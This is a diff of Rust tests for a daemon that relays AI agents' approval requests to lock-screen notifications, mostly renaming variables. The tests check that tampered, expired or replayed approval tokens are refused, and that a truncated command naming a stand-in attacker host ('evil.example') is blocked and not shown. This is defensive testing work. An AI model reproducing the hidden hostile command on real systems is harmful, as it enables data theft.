-    let r = act(&ticket_a, sign(&expired)).await;
-    assert!(refused(&r, true), "expired: {r:?}");
+    let result = act(&ticket_a, sign(&expired)).await;
+    assert!(refused(&result, true), "expired: {result:?}");
     let old = push::ActionToken {
         v: 1,
         ..real.clone()
     };
-    let r = act(&ticket_a, sign(&old)).await;
-    assert!(refused(&r, true), "old version: {r:?}");
-    let r = act(&ticket_a, token[..token.len() - 1].to_vec()).await;
-    assert!(refused(&r, true), "truncated: {r:?}");
+    let result = act(&ticket_a, sign(&old)).await;
+    assert!(refused(&result, true), "old version: {result:?}");
+    let result = act(&ticket_a, token[..token.len() - 1].to_vec()).await;
+    assert!(refused(&result, true), "truncated: {result:?}");
     let mut flipped = token.clone();
     flipped[10] ^= 1;
-    let r = act(&ticket_a, flipped).await;
-    assert!(refused(&r, true), "flipped: {r:?}");
+    let result = act(&ticket_a, flipped).await;
+    assert!(refused(&result, true), "flipped: {result:?}");
     // Daemon-signed, but for the other pane, or another request id.
     let other_pane = push::ActionToken {
         pane: shown,
         ..real.clone()
     };
-    let r = act(&ticket_a, sign(&other_pane)).await;
-    assert!(refused(&r, false), "other pane: {r:?}");
+    let result = act(&ticket_a, sign(&other_pane)).await;
+    assert!(refused(&result, false), "other pane: {result:?}");
     let other_request = push::ActionToken {
         request: proto::RequestId(real.request.0 + 1),
         ..real.clone()
     };
-    let r = act(&ticket_a, sign(&other_request)).await;
-    assert!(refused(&r, false), "other request: {r:?}");
+    let result = act(&ticket_a, sign(&other_request)).await;
+    assert!(refused(&result, false), "other request: {result:?}");
     assert!(!waiting.is_finished(), "the agent is still waiting");
 
     // The daemon restarts: the token decides nothing on the new run.
     daemon.shutdown().await;
     drop(waiting);
     let daemon = start(state.path(), &relay, 200).await;
-    let r = act(&ticket(&daemon), token).await;
-    assert!(refused(&r, false), "after restart: {r:?}");
-    drop((a, b));
+    let result = act(&ticket(&daemon), token).await;
+    assert!(refused(&result, false), "after restart: {result:?}");
+    drop((device_a, device_b));
     daemon.shutdown().await;
 }
 
@@ -1164,10 +1223,10 @@ async fn a_cut_approval_summary_offers_no_lock_screen_approve() {
     let state = tempfile::tempdir().unwrap();
     let mut relay = FakeRelay::start().await;
     let daemon = start(state.path(), &relay, 200).await;
-    let a = device(&ticket(&daemon), "cap-a", PushPrefs::default()).await;
-    let mut b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
-    let (_shown, hidden) = two_panes(&mut b).await;
-    a.client.client.set_view(None, vec![]);
+    let device_a = device(&ticket(&daemon), "cap-a", PushPrefs::default()).await;
+    let mut device_b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    let (_shown, hidden) = two_panes(&mut device_b).await;
+    device_a.client.client.set_view(None, vec![]);
     let mut payload: serde_json::Value = serde_json::from_str(PERMISSION).unwrap();
     payload["cwd"] = "/".into();
     payload["tool_input"]["command"] =
@@ -1176,12 +1235,12 @@ async fn a_cut_approval_summary_offers_no_lock_screen_approve() {
 
     let pushed = verify(&relay.next("approval push").await, &daemon);
     assert_eq!(pushed.category, Some(push::Category::Blocked));
-    let note = client_core::push::open_notification(&a.seal_secret, &pushed.sealed).unwrap();
+    let note = client_core::push::open_notification(&device_a.seal_secret, &pushed.sealed).unwrap();
     assert!(note.body.ends_with('…'), "{note:?}");
     assert!(!note.body.contains("evil.example"), "{note:?}");
     assert_eq!(note.kind, push::Kind::Blocked);
     assert!(note.action.is_none(), "{note:?}");
-    drop((a, b));
+    drop((device_a, device_b));
     daemon.shutdown().await;
 }
 
@@ -1221,18 +1280,18 @@ async fn a_drive_request_is_answered_from_the_lock_screen() {
     let state = tempfile::tempdir().unwrap();
     let mut relay = FakeRelay::start().await;
     let url = relay.url.clone();
-    let daemon = start_with(state.path(), move |c| {
-        c.push.relay_url = url;
-        c.push.delay = Duration::from_millis(200);
-        c.push.backoff = Duration::from_millis(50);
-        c.drive_ask_wait = Duration::from_secs(30);
+    let daemon = start_with(state.path(), move |config| {
+        config.push.relay_url = url;
+        config.push.delay = Duration::from_millis(200);
+        config.push.backoff = Duration::from_millis(50);
+        config.drive_ask_wait = Duration::from_secs(30);
     })
     .await;
     let ticket_a = ticket(&daemon);
-    let a = device(&ticket_a, "cap-a", PushPrefs::default()).await;
-    let mut b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
-    let (shown, hidden) = two_panes(&mut b).await;
-    a.client.client.set_view(None, vec![]);
+    let device_a = device(&ticket_a, "cap-a", PushPrefs::default()).await;
+    let mut device_b = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    let (shown, hidden) = two_panes(&mut device_b).await;
+    device_a.client.client.set_view(None, vec![]);
 
     // The agent in the hidden pane asks to type into the user's shown pane.
     let typing = term_call(
@@ -1244,7 +1303,7 @@ async fn a_drive_request_is_answered_from_the_lock_screen() {
     );
     let pushed = verify(&relay.next("drive push").await, &daemon);
     assert_eq!(pushed.category, Some(push::Category::Approval));
-    let note = client_core::push::open_notification(&a.seal_secret, &pushed.sealed).unwrap();
+    let note = client_core::push::open_notification(&device_a.seal_secret, &pushed.sealed).unwrap();
     assert_eq!(note.pane, hidden.0);
     assert!(note.title.contains("wants to type into"), "{note:?}");
     assert_eq!(note.body, "Type “echo from-lock”, then Return");
@@ -1257,7 +1316,7 @@ async fn a_drive_request_is_answered_from_the_lock_screen() {
 
     let decided = send_action(
         &ticket_a,
-        options(&a.key),
+        options(&device_a.key),
         ConnectOptions::default(),
         token.clone(),
         Decision::Approve,
@@ -1271,12 +1330,12 @@ async fn a_drive_request_is_answered_from_the_lock_screen() {
         .expect("the call answered")
         .unwrap();
     assert!(matches!(reply, daemon::TermReply::Ok(_)), "{reply:?}");
-    b.wait_text(shown, "from-lock").await;
+    device_b.wait_text(shown, "from-lock").await;
 
     // The token is spent with the request it named.
     let again = send_action(
         &ticket_a,
-        options(&a.key),
+        options(&device_a.key),
         ConnectOptions::default(),
         token,
         Decision::Approve,
@@ -1292,13 +1351,13 @@ async fn a_drive_request_is_answered_from_the_lock_screen() {
         ),
         "{again:?}"
     );
-    let page = a.client.client.audit(None, 100).await.unwrap();
+    let page = device_a.client.client.audit(None, 100).await.unwrap();
     assert!(page.chain_ok);
     let approval = page
         .records
         .iter()
-        .filter_map(|r| r.approval.as_ref())
-        .find(|a| a.tool.as_deref() == Some("pane_send"))
+        .filter_map(|record| record.approval.as_ref())
+        .find(|approval| approval.tool.as_deref() == Some("pane_send"))
         .expect("the lock-screen answer is audited");
     assert_eq!(approval.option, "Allow once");
     assert!(approval.summary.contains("echo from-lock"));
@@ -1314,9 +1373,9 @@ async fn a_drive_request_is_answered_from_the_lock_screen() {
     );
     let pushed = verify(&relay.next("long drive push").await, &daemon);
     assert_eq!(pushed.category, Some(push::Category::Blocked));
-    let note = client_core::push::open_notification(&a.seal_secret, &pushed.sealed).unwrap();
+    let note = client_core::push::open_notification(&device_a.seal_secret, &pushed.sealed).unwrap();
     assert!(note.action.is_none(), "{note:?}");
     assert!(!note.body.contains("evil.example"), "{note:?}");
-    drop((a, b));
+    drop((device_a, device_b));
     daemon.shutdown().await;
 }
